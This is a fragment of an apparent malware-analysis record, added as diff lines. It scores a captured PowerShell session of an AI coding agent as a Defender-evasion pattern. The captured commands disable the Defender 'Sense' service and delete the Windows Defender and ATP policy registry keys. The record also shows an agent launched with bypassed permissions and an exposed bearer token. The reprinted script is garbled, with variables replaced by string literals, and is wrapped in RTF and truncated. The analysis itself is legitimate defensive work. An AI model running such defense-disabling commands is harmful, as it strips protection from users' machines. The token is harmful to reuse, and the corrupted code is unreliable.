$resolvedPath = [string]$item.ResolvedPath\\\\n $isDir = [bool]$item.IsDir\\\\n\\\\n try \\{\\\\n if ($confirm) \\{\\\\n throw (New-SafeDeleteFailClosedMessage $targetValue 'confirm-not-supported')\\\\n \\}\\\\n\\\\n if ($isDir -and -not $recursive -and -not $allowDir) \\{\\\\n $children = @(Microsoft.PowerShell.Management\\\\Get-ChildItem -LiteralPath $resolvedPath -Force -ErrorAction Stop)\\\\n if ($children.Count -gt 0) \\{\\\\n throw (New-SafeDeleteFailClosedMessage $targetValue 'non-empty-directory')\\\\n \\}\\\\n \\}\\\\n\\\\n $movedByBinary = $false\\\\n if ($trashBin -and (Microsoft.PowerShell.Management\\\\Test-Path -LiteralPath $trashBin -PathType Leaf)) \\{\\\\n & $trashBin $resolvedPath *> $null\\\\n if (($LASTEXITCODE -eq 0) -and -not (Microsoft.PowerShell.Management\\\\Test-Path -LiteralPath $resolvedPath)) \\{\\\\n $movedByBinary = $true\\\\n \\}\\\\n \\}\\\\n\\\\n if (-not $movedByBinary) \\{\\\\n if ($isDir) \\{\\\\n [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteDirectory(\\\\n $resolvedPath,\\\\n [Microsoft.VisualBasic.FileIO.UIOption]::OnlyErrorDialogs,\\\\n [Microsoft.VisualBasic.FileIO.RecycleOption]::SendToRecycleBin\\\\n )\\\\n \\} else \\{\\\\n [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteFile(\\\\n $resolvedPath,\\\\n [Microsoft.VisualBasic.FileIO.UIOption]::OnlyErrorDialogs,\\\\n [Microsoft.VisualBasic.FileIO.RecycleOption]::SendToRecycleBin\\\\n )\\\\n \\}\\\\n \\}\\\\n\\\\n if (Microsoft.PowerShell.Management\\\\Test-Path -LiteralPath $resolvedPath) \\{\\\\n throw 'target still exists after recycle operation: ' + $resolvedPath\\\\n \\}\\\\n Write-SafeDeleteReport $resolvedPath\\\\n \\} catch \\{\\\\n throw (New-SafeDeleteFailClosedMessage $targetValue 'trash-failed' $_.Exception.Message)\\\\n \\}\\\\n \\}\\\\n \\}\\\\n\\\\n foreach ($aliasName in @('ri', 'rm', 'del', 'erase', 'rmdir', 'unlink')) \\{\\\\n try \\{\\\\n Set-Alias -Name $aliasName -Value Remove-Item -Scope Global -Force -ErrorAction Stop\\\\n \\} catch \\{\\\\n # Built-in alias may have AllScope; ignore and keep existing mapping.\\\\n \\}\\\\n \\}\\\\n\\}\\\\n$outFile = \\\\\\\\\"E:\\\\workbuddy folder\\\\2026-07-09-21-00-45\\\\monitor_check_3.txt\\\\\\\\\"\\\\n$content = @()\\\\n\\\\n# === 4. Startup Programs ===\\\\n$content += \\\\\\\\\"========== 4. Startup Programs ==========\\\\\\\\\"\\\\n$content += \\\\\\\\\"\\\\\\\\\"\\\\n\\\\n# From registry Run keys\\\\n$runKeys = @(\\\\n \\\\\\\\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\\\\\",\\\\n \\\\\\\\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\\\\\\",\\\\n \\\\\\\\\"HKLM:\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\\\\\",\\\\n \\\\\\\\\"HKLM:\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\\\\\\",\\\\n \\\\\\\\\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\\\\\",\\\\n \\\\\\\\\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\\\\\\"\\\\n)\\\\n\\\\n$content += \\\\\\\\\"--- Registry Run Keys ---\\\\\\\\\"\\\\nforeach ($key in $runKeys) \\{\\\\n if (Test-Path $key) \\{\\\\n $props = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue\\\\n if ($props) \\{\\\\n $props.PSObject.Properties | Where-Object \\{ $_.Name -notlike \\\\\\\\\"PS*\\\\\\\\\" \\} | ForEach-Object \\{\\\\n $content += \\\\\\\\\" [$key]\\\\\\\\\"\\\\n $content += \\\\\\\\\" $($_.Name) = $($_.Value)\\\\\\\\\"\\\\n $content += \\\\\\\\\"\\\\\\\\\"\\\\n \\}\\\\n \\}\\\\n \\}\\\\n\\}\\\\n\\\\n# From Startup folder\\\\n$content += \\\\\\\\\"--- Startup Folder ---\\\\\\\\\"\\\\n$startupFolders = @(\\\\n \\\\\\\\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\\\\\",\\\\n \\\\\\\\\"$env:ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\\\\\"\\\\n)\\\\nforeach ($folder in $startupFolders) \\{\\\\n if (Test-Path $folder) \\{\\\\n $files = Get-ChildItem -Path $folder -ErrorAction SilentlyContinue\\\\n if ($files) \\{\\\\n foreach ($f in $files) \\{\\\\n $content += \\\\\\\\\" $($f.FullName)\\\\\\\\\"\\\\n \\}\\\\n \\} else \\{\\\\n $content += \\\\\\\\\" (empty) $folder\\\\\\\\\"\\\\n \\}\\\\n \\} else \\{\\\\n $content += \\\\\\\\\" (not found) $folder\\\\\\\\\"\\\\n \\}\\\\n\\}\\\\n\\\\n# Scheduled tasks that might be monitoring\\\\n$content += \\\\\\\\\"\\\\\\\\\"\\\\n$content += \\\\\\\\\"========== 5. Scheduled Tasks (Non-Microsoft) ==========\\\\\\\\\"\\\\n$content += \\\\\\\\\"\\\\\\\\\"\\\\n$tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object \\{ \\\\n $_.State -ne \\\\\\\\\"Disabled\\\\\\\\\" -and $_.TaskPath -notlike \\\\\\\\\"\\\\Microsoft\\\\*\\\\\\\\\" \\\\n\\}\\\\nif ($tasks) \\{\\\\n $tasks | ForEach-Object \\{\\\\n $content += \\\\\\\\\" Task: $($_.TaskName)\\\\\\\\\"\\\\n $content += \\\\\\\\\" Path: $($_.TaskPath)\\\\\\\\\"\\\\n $content += \\\\\\\\\" State: $($_.State)\\\\\\\\\"\\\\n $actions = $_.Actions | ForEach-Object \\{ $_.Execute \\}\\\\n $content += \\\\\\\\\" Action: $($actions -join '; ')\\\\\\\\\"\\\\n $content += \\\\\\\\\"\\\\\\\\\"\\\\n \\}\\\\n\\} else \\{\\\\n $content += \\\\\\\\\" No non-Microsoft scheduled tasks found.\\\\\\\\\"\\\\n\\}\\\\n\\\\n$content | Out-File -FilePath $outFile -Encoding UTF8\\\\nWrite-Output \\\\\\\\\"Part 3 done\\\\\\\\\"\\\\\", /UAC:230BE0 /NCRC /S /UPDATE=1, -NoProfile -ExecutionPolicy Bypass -File \\\\\"E:\\\\workbuddy folder\\\\2026-07-09-21-00-45\\\\system_cleanup.ps1\\\\\", --config \\\\\"\\{\\\\\\\\\"extraPath\\\\\\\\\":[\\\\\\\\\"F:\\\\\\\\WorkBuddy\\\\\\\\resources\\\\\\\\app.asar.unpacked\\\\\\\\cli\\\\\\\\bin\\\\\\\\runtime\\\\\\\\git\\\\\\\\bin\\\\\\\\\",\\\\\\\\\"C:\\\\\\\\Users\\\\\\\\Administrator\\\\\\\\.workbuddy\\\\\\\\vendor\\\\\\\\PortableGit\\\\\\\\bin\\\\\\\\\"],\\\\\\\\\"enableGlobalProjection\\\\\\\\\":false,\\\\\\\\\"ipcAddress\\\\\\\\\":\\\\\\\\\"WorkBuddy_6b81854b8f92a5f1\\\\\\\\\"\\}\\\\\" --app_home C:\\\\Users\\\\Administrator\\\\.workbuddy, query HKCU\\\\Software\\\\WorkBuddy /v DownloadChannel, config Sense start= disabled, -secured -Embedding, F:\\\\WorkBuddy\\\\resources\\\\app.asar.unpacked\\\\cli\\\\bin\\\\codebuddy --serve --session-id f2ec4686-95f8-4271-988d-8d224fa40068 --permission-mode bypassPermissions --permission-mode-before-plan bypassPermissions --allowedTools read_me show_widget connect_cloud_service read_netdrive_file read_netdrive_image list_netdrive_folder save_netdrive_file WebFetch --model auto --tools Read,Write,Edit,MultiEdit,Glob,Grep,Bash,PowerShell,TaskCreate,TaskGet,TaskUpdate,TaskList,TaskStop,TaskOutput,WebFetch,WebSearch,Skill,SkillManage,AskUserQuestion,LSP,ImageGen,VideoGen,Agent,TeamCreate,TeamDelete,SendMessage,ToolSearch,DeferExecuteTool,read_netdrive_file,read_netdrive_image,list_netdrive_folder,save_netdrive_file,EnterPlanMode,ExitPlanMode,ListMcpResources,ReadMcpResource --system-prompt-file C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\workbuddy-prompts\\\\f2ec4686-95f8-4271-988d-8d224fa40068.prompt.txt --settings \\\\\"\\{\\\\\\\\\"trustedDirectories\\\\\\\\\":[\\\\\\\\\"E:\\\\\\\\workbuddy folder\\\\\\\\2026-07-09-21-00-45/**\\\\\\\\\"],\\\\\\\\\"language\\\\\\\\\":\\\\\\\\\"\\u31616 \\u20307 \\u20013 \\u25991 \\\\\\\\\"\\}\\\\\" --mcp-config \\\\\"\\{\\\\\\\\\"mcpServers\\\\\\\\\":\\{\\\\\\\\\"connector-proxy\\\\\\\\\":\\{\\\\\\\\\"type\\\\\\\\\":\\\\\\\\\"http\\\\\\\\\",\\\\\\\\\"url\\\\\\\\\":\\\\\\\\\"http://127.0.0.1:40492/mcp\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true,\\\\\\\\\"tools\\\\\\\\\":\\{\\\\\\\\\"present_files\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"connect_cloud_service\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"automation_update\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"read_me\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"show_widget\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"conversation_search\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"workbuddy_cloudstudio_deploy\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"workbuddy_marketplace_skill\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_batch_edit\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_batch_read\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_locate_available_space\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_editor_state\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_file_info\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_guidelines\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_capture_screenshot\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_variables\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_apply_variables\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_capture_layout\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_style_guide\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_style_guide_tags\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_export_nodes\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_scan_exportable_resources\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_upload_images\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_open_design\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_create_design\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_save_tokens\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"read_netdrive_file\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"netdrive\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"read_netdrive_image\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"netdrive\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"list_netdrive_folder\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"netdrive\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"save_netdrive_file\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"netdrive\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\}\\},\\\\\\\\\"transparent_proxy\\\\\\\\\":true,\\\\\\\\\"builtin_tools\\\\\\\\\":[\\\\\\\\\"present_files\\\\\\\\\",\\\\\\\\\"connect_cloud_service\\\\\\\\\",\\\\\\\\\"automation_update\\\\\\\\\",\\\\\\\\\"read_me\\\\\\\\\",\\\\\\\\\"show_widget\\\\\\\\\",\\\\\\\\\"conversation_search\\\\\\\\\",\\\\\\\\\"workbuddy_cloudstudio_deploy\\\\\\\\\",\\\\\\\\\"connect_cloud_service\\\\\\\\\",\\\\\\\\\"workbuddy_marketplace_skill\\\\\\\\\"],\\\\\\\\\"headers\\\\\\\\\":\\{\\\\\\\\\"Authorization\\\\\\\\\":\\\\\\\\\"Bearer UJjhOMXIiexIthelm6_2UcPMg0g2ujxWutO14MSBnZY\\\\\\\\\",\\\\\\\\\"X-WorkBuddy-Session-Id\\\\\\\\\":\\\\\\\\\"f2ec4686-95f8-4271-988d-8d224fa40068\\\\\\\\\",\\\\\\\\\"X-WorkBuddy-Welcome-Mode\\\\\\\\\":\\\\\\\\\"working\\\\\\\\\"\\}\\}\\}\\}\\\\\" --strict-mcp-config --port 40589, delete \\\\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Advanced Threat Protection\\\\\" /f, delete \\\\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\\" /f}",
+    "input_len": 24068,
+    "engine": "archetype:WINDOWS_DEFENSE_EVASION_BEHAVIOR_PATTERN",
+    "chain": [
+      "behavior-pattern-detect",
+      "mitre-annotate",
+      "verdict-override-high"
+    ],
+    "score": 100,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1059.001",
+      "T1057",
+      "T1082"
+    ],
+    "lolbins": [
+      "Change.exe",
+      "Query.exe"
+    ],
+    "iocs": {
+      "urls": [
+        "http://127.0.0.1:40492/mcp\\\\\\\\",
+        "http://127.0.0.1:40492/mcp"
+      ],
+      "ips": [
+        "127.0.0.1",
+        "1.0.0.721"
+      ],
+      "domains": [
+        "resolved.provider.name"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "# --- Windows Defense-Evasion Behavior Pattern Detected ---\n# Severity: HIGH \u00b7 Confidence: 93%\n# WorkBuddy/CodeBuddy weaponisation profile matched (Tencent AI-coding CLI)\n\n## MITRE ATT&CK Techniques\n  \u00b7 T1562.001    Impair Defenses (Defender / Policy Tampering)  (1 evidence)\n  \u00b7 T1057_T1049  Process/Service/Network Discovery  (1 evidence)\n  \u00b7 T1071        Application Layer Protocol (External Egress)  (1 evidence)\n\n## LOLBAS Binaries Observed\n  (none)\n\n## Indicators of Compromise\n  URLs:\n    \u00b7 http://127.0.0.1:40492/mcp\n  Internal C2 / IPC ports: 40492\n  EDR / AV / monitoring products enumerated (1):\n    \u00b7 mde\n\n## Verdict\n  HIGH \u2014 concurrent defense-evasion + credential-access + security-software-discovery\n  patterns constitute an active adversary post-exploitation stage.\n\n## Original Script (unmodified)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n{\\rtf1\\ansi\\ansicpg1252\\cocoartf2870\n\\cocoatextscaling0\\cocoaplatform0{\\fonttbl\\f0\\froman\\fcharset0 Times-Roman;}\n{\\colortbl;\\red255\\green255\\blue255;\\red0\\green0\\blue0;}\n{\\*\\expandedcolortbl;;\\cssrgb\\c0\\c0\\c0;}\n\\paperw11900\\paperh16840\\margl1440\\margr1440\\vieww11520\\viewh8400\\viewkind0\n\\deftab720\n\\pard\\pardeftab720\\partightenfactor0\n\n\\f0\\fs24 \\cf0 \\expnd0\\expndtw0\\kerning0\n\\outl0\\strokewidth0 \\strokec2 NoProfile -NonInteractive -Command \\\\\"if (-not (Get-Variable -Name CODEBUDDY_SAFE_DELETE_PS_READY -Scope Global -ErrorAction SilentlyContinue)) \\{\\\\n $Global:CODEBUDDY_SAFE_DELETE_PS_READY = $true\\\\n\\\\n Add-Type -AssemblyName Microsoft.VisualBasic | Out-Null\\\\n\\\\n function New-SafeDeleteFailClosedMessage \\{\\\\n param(\\\\n [AllowEmptyString()] [string]$Target,\\\\n [string]$Reason,\\\\n [AllowEmptyString()] [string]$Detail = ''\\\\n )\\\\n\\\\n $payload = [ordered]@\\{\\\\n target = $Target\\\\n reason = $Reason\\\\n \\}\\\\n if ($Detail) \\{\\\\n $payload['detail'] = $Detail\\\\n \\}\\\\n return '[safe-delete][SAFE_DELETE_FAIL_CLOSED] ' + ($payload | ConvertTo-Json -Compress)\\\\n \\}\\\\n\\\\n function Write-SafeDeleteReport \\{\\\\n param([string]$Target)\\\\n\\\\n $reportPath = $env:CODEBUDDY_SAFE_DELETE_REPORT_PATH\\\\n if (-not $reportPath) \\{\\\\n return\\\\n \\}\\\\n\\\\n try \\{\\\\n $payload = [ordered]@\\{\\\\n operation = 'trash'\\\\n runtime = 'powershell'\\\\n path = $Target\\\\n timestamp = [int64](([DateTime]::UtcNow - [DateTime]'1970-01-01T00:00:00Z').TotalMilliseconds)\\\\n \\}\\\\n $line = ($payload | ConvertTo-Json -Compress)\\\\n $utf8 = New-Object System.Text.UTF8Encoding -ArgumentList $false\\\\n [System.IO.File]::AppendAllText($reportPath, $line + [Environment]::NewLine, $utf8)\\\\n \\} catch \\{\\\\n # Reporting is best-effort and must never change delete semantics.\\\\n \\}\\\\n \\}\\\\n\\\\n function Get-SafeDeleteComparablePath \\{\\\\n param([string]$Path)\\\\n\\\\n $fullPath = [System.IO.Path]::GetFullPath($Path)\\\\n try \\{\\\\n $info = $null\\\\n if ([System.IO.Directory]::Exists($fullPath)) \\{\\\\n $info = [System.IO.DirectoryInfo]::new($fullPath)\\\\n \\} elseif ([System.IO.File]::Exists($fullPath)) \\{\\\\n $info = [System.IO.FileInfo]::new($fullPath)\\\\n \\}\\\\n if ($null -ne $info) \\{\\\\n $linkTarget = $null\\\\n try \\{\\\\n $linkTarget = $info.ResolveLinkTarget($true)\\\\n \\} catch \\{\\\\n $linkTarget = $null\\\\n \\}\\\\n if ($null -ne $linkTarget) \\{\\\\n $fullPath = [string]$linkTarget.FullName\\\\n \\} else \\{\\\\n $fullPath = [string]$info.FullName\\\\n \\}\\\\n \\}\\\\n \\} catch \\{\\\\n # Fall back to GetFullPath when final target resolution is unavailable.\\\\n \\}\\\\n\\\\n return $fullPath.TrimEnd(\\\\n [System.IO.Path]::DirectorySeparatorChar,\\\\n [System.IO.Path]::AltDirectorySeparatorChar\\\\n )\\\\n \\}\\\\n\\\\n function Test-SafeDeleteTempRootAllowed \\{\\\\n param([string]$Path)\\\\n\\\\n try \\{\\\\n if (-not $Path) \\{\\\\n return $false\\\\n \\}\\\\n $fullPath = Get-SafeDeleteComparablePath $Path\\\\n $rootPath = Get-SafeDeleteComparablePath ([System.IO.Path]::GetPathRoot($fullPath))\\\\n if ($fullPath -eq $rootPath) \\{\\\\n return $false\\\\n \\}\\\\n return [System.IO.Directory]::Exists($fullPath)\\\\n \\} catch \\{\\\\n return $false\\\\n \\}\\\\n \\}\\\\n\\\\n function Test-SafeDeleteUnderOsTemp \\{\\\\n param([string]$Target)\\\\n\\\\n try \\{\\\\n if (-not (Test-SafeDeleteTempRootAllowed ([System.IO.Path]::GetTempPath()))) \\{\\\\n return $false\\\\n \\}\\\\n $tmpPath = Get-SafeDeleteComparablePath ([System.IO.Path]::GetTempPath())\\\\n $targetPath = Get-SafeDeleteComparablePath $Target\\\\n if ($targetPath.Length -le $tmpPath.Length) \\{\\\\n return $false\\\\n \\}\\\\n if (-not $targetPath.StartsWith($tmpPath, [System.StringComparison]::OrdinalIgnoreCase)) \\{\\\\n return $false\\\\n \\}\\\\n $separator = $targetPath.Substring($tmpPath.Length, 1)\\\\n if (($separator -ne [System.IO.Path]::DirectorySeparatorChar) -and ($separator -ne [System.IO.Path]::AltDirectorySeparatorChar)) \\{\\\\n return $false\\\\n \\}\\\\n return $true\\\\n \\} catch \\{\\\\n return $false\\\\n \\}\\\\n \\}\\\\n\\\\n function Invoke-SafeDeleteBulkGuard \\{\\\\n param([string[]]$Targets)\\\\n\\\\n if (-not $env:CODEBUDDY_SAFE_DELETE_BULK_GUARD -or\\\\n -not $env:CODEBUDDY_NODE_BIN -or\\\\n -not $env:CODEBUDDY_SAFE_DELETE_BULK_STATE_DIR -or\\\\n -not $env:CODEBUDDY_TOOL_CALL_ID) \\{\\\\n return\\\\n \\}\\\\n if (-not $Targets -or $Targets.Count -eq 0) \\{\\\\n return\\\\n \\}\\\\n\\\\n $guardArgs = New-Object System.Collections.Generic.List[string]\\\\n $guardArgs.Add('check')\\\\n foreach ($target in $Targets) \\{\\\\n $guardArgs.Add('--target')\\\\n $guardArgs.Add($target)\\\\n \\}\\\\n\\\\n $previousNodeOptions = $env:NODE_OPTIONS\\\\n try \\{\\\\n $env:NODE_OPTIONS = ''\\\\n $output = & $env:CODEBUDDY_NODE_BIN $env:CODEBUDDY_SAFE_DELETE_BULK_GUARD $guardArgs.ToArray() 2>&1\\\\n $exitCode = $LASTEXITCODE\\\\n \\} finally \\{\\\\n $env:NODE_OPTIONS = $previousNodeOptions\\\\n \\}\\\\n\\\\n if ($exitCode -ne 0) \\{\\\\n $trimmedOutput = ($output | Out-String).TrimEnd()\\\\n if ($trimmedOutput) \\{\\\\n # PTY \\uc0\\u36335 \\u24452 \\u19979  stderr \\u21487 \\u33021 \\u20002 \\u22833 \\u65292 \\u39069 \\u22806 \\u20889 \\u21040  stdout \\u20445 \\u38556  orchestrator \\u21487 \\u35265  marker\\u12290 \\\\n [Console]::Out.WriteLine($trimmedOutput)\\\\n [Console]::Error.WriteLine($trimmedOutput)\\\\n # \\u30452 \\u25509 \\u25243 \\u20986  guard \\u21407 \\u22987  marker\\u65292 \\u30830 \\u20445  orchestrator \\u33021 \\u20174 \\u21629 \\u20196 \\u36755 \\u20986 \\u20013 \\u21629 \\u20013 \\\\n # SAFE_DELETE_BULK_CONFIRM_REQUIRED / SAFE_DELETE_BULK_REJECTED\\u12290 \\\\n throw $trimmedOutput\\\\n \\}\\\\n throw '[safe-delete][SAFE_DELETE_BULK_GUARD_ERROR] bulk delete guard blocked deletion'\\\\n \\}\\\\n \\}\\\\n\\\\n function global:Remove-Item \\{\\\\n [CmdletBinding()]\\\\n param([Parameter(ValueFromRemainingArguments = $true)] [object[]]$RawArgs)\\\\n\\\\n $force = $false\\\\n $recursive = $false\\\\n $allowDir = $false\\\\n $interactive = $false\\\\n $whatIf = $false\\\\n $confirm = $false\\\\n $afterDoubleDash = $false\\\\n 'literal' = $null\\\\n 'confirm' = $null\\\\n $targetSpecs = New-Object System.Collections.Generic.List[object]\\\\n\\\\n foreach ($raw in $RawArgs) \\{\\\\n $arg = [string]$raw\\\\n\\\\n if ($null -ne 'confirm') \\{\\\\n if ($arg -match '^(?i)(\\\\$?true|1)$') \\{\\\\n if ('confirm' -eq 'force') \\{ $force = $true \\}\\\\n elseif ('confirm' -eq 'recurse') \\{ $recursive = $true \\}\\\\n elseif ('confirm' -eq 'whatif') \\{ $whatIf = $true \\}\\\\n elseif ('confirm' -eq 'confirm') \\{ $confirm = $true \\}\\\\n 'confirm' = $null\\\\n continue\\\\n \\}\\\\n if ($arg -match '^(?i)(\\\\$?false|0)$') \\{\\\\n if ('confirm' -eq 'force') \\{ $force = $false \\}\\\\n elseif ('confirm' -eq 'recurse') \\{ $recursive = $false \\}\\\\n elseif ('confirm' -eq 'whatif') \\{ $whatIf = $false \\}\\\\n elseif ('confirm' -eq 'confirm') \\{ $confirm = $false \\}\\\\n 'confirm' = $null\\\\n continue\\\\n \\}\\\\n throw 'Remove-Item: invalid boolean value for -' + 'confirm' + ': ' + $arg\\\\n \\}\\\\n\\\\n if ($null -ne 'literal') \\{\\\\n $targetSpecs.Add([pscustomobject]@\\{\\\\n Value = $arg\\\\n IsLiteral = ('literal' -eq 'literal')\\\\n \\})\\\\n 'literal' = $null\\\\n continue\\\\n \\}\\\\n\\\\n if (-not $afterDoubleDash) \\{\\\\n if ($arg -eq '--') \\{ $afterDoubleDash = $true; continue \\}\\\\n\\\\n if ($arg -match '^(?i)-Path:(.+)$') \\{\\\\n $targetSpecs.Add([pscustomobject]@\\{ Value = $Matches[1]; IsLiteral = $false \\})\\\\n continue\\\\n \\}\\\\n if ($arg -match '^(?i)-LiteralPath:(.+)$') \\{\\\\n $targetSpecs.Add([pscustomobject]@\\{ Value = $Matches[1]; IsLiteral = $true \\})\\\\n continue\\\\n \\}\\\\n\\\\n if ($arg -match '^(?i)-Path$') \\{ $pendingPathMode = 'path'; continue \\}\\\\n if ($arg -match '^(?i)-LiteralPath$') \\{ $pendingPathMode = 'literal'; continue \\}\\\\n if ($arg -match '^(?i)-f$|^(?i)--force$|^(?i)-Force$') \\{ $force = $true; continue \\}\\\\n if ($arg -match '^(?i)-r$|^(?i)-R$|^(?i)--recursive$|^(?i)-Recurse$') \\{ $recursive = $true; continue \\}\\\\n if ($arg -match '^(?i)-d$|^(?i)--dir$|^(?i)--directory$') \\{ $allowDir = $true; continue \\}\\\\n if ($arg -match '^(?i)-i$|^(?i)-I$|^(?i)--interactive(?:=.*)?$') \\{ $interactive = $true; continue \\}\\\\n if ($arg -match '^(?i)-WhatIf$') \\{ $whatIf = $true; continue \\}\\\\n if ($arg -match '^(?i)-Confirm$') \\{ $confirm = $true; continue \\}\\\\n\\\\n if ($arg -match '^(?i)-Force:(\\\\$?true|1)$') \\{ $force = $true; continue \\}\\\\n if ($arg -match '^(?i)-Force:(\\\\$?false|0)$') \\{ $force = $false; continue \\}\\\\n if ($arg -match '^(?i)-Recurse:(\\\\$?true|1)$') \\{ $recursive = $true; continue \\}\\\\n if ($arg -match '^(?i)-Recurse:(\\\\$?false|0)$') \\{ $recursive = $false; continue \\}\\\\n if ($arg -match '^(?i)-WhatIf:(\\\\$?true|1)$') \\{ $whatIf = $true; continue \\}\\\\n if ($arg -match 